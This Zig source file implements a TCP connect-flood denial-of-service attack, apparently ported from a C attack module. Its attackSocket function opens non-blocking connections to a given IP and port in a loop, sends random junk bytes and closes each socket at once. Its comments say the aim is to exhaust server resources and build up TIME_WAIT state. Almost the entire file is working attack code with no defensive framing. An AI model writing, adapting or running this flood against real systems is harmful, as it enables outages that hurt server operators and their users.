//! # TCP Socket Flood (Connect Flood)
//!
//! Opens real TCP connections to exhaust server resources.
//!
//! ## C Reference: modules/attack/methods/socket.c (57 lines)

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

// ============================================================
// TCP SOCKET FLOOD (from C: socket.c attack_socket lines 17-56)
// ============================================================
// Opens real connections, sends garbage, closes rapidly.
// Stresses accept queue and causes TIME_WAIT buildup.

pub fn attackSocket(ip: u32, port: u16, duration: u32) void {
    const end_time = std.time.timestamp() + duration;
    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    while (std.time.timestamp() < end_time) {
        // Create socket (from C: line 31)
        const sock = posix.socket(posix.AF.INET, posix.SOCK.STREAM, 0) catch continue;

        // Non-blocking (from C: line 35)
        const flags = posix.fcntl(sock, posix.F.GETFL, 0) catch {
            posix.close(sock);
            continue;
        };
        _ = posix.fcntl(sock, posix.F.SETFL, flags | @as(u32, @bitCast(posix.O{ .NONBLOCK = true }))) catch {
            posix.close(sock);
            continue;
        };

        // Connect (from C: line 37)
        var dest: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = std.mem.nativeToBig(u16, port),
            .addr = ip,
        };
        _ = posix.connect(sock, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};

        // Send garbage payload (from C: lines 47-49)
        var junk: [32]u8 = undefined;
        std.mem.writeInt(u32, junk[0..4], rng.next(), .little);
        std.mem.writeInt(u32, junk[4..8], rng.next(), .little);
        _ = posix.send(sock, &junk, posix.MSG.NOSIGNAL) catch {};

        // Close immediately (from C: line 54)
        // Aggressive closing causes TIME_WAIT stress
        posix.close(sock);
    }
}
